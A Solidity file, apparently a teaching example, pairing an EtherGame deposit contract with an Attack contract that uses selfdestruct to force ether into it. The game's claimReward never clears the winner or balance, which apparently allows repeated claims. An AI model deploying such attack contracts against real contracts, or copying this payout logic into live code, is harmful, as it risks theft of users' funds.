// SPDX-License-Identifier: MIT
pragma solidity ^0.8.9;

contract EtherGame{
    uint public target = 3 ether;

    uint public balance;

    address public winner;
    
    ///not more than 1 ether
    error error1();

    ///game is over
    error error2();

    ///you are not the winner
    error error3();

    ///failed to send
    error error4();

    function deposit() external payable{
        if(msg.value>1 ether){
            revert error1();
        }
        balance+=msg.value;

        if(balance>target){
            revert error2();
        }

        if(balance==target){
            winner =msg.sender;
        }
    }

    function claimReward() public {

        if(winner!=msg.sender){
            revert error3();
        }

        (bool sent ,) = msg.sender.call{value:balance}("");

        if(!sent){
            revert error4();
        }
    }
}

contract Attack {

    EtherGame etherGame;

    constructor (EtherGame _etherGame){
       etherGame = _etherGame;
    }

    function attack() external  payable {

        address payable  add1= payable(address(etherGame));

        selfdestruct(add1);
    }
}
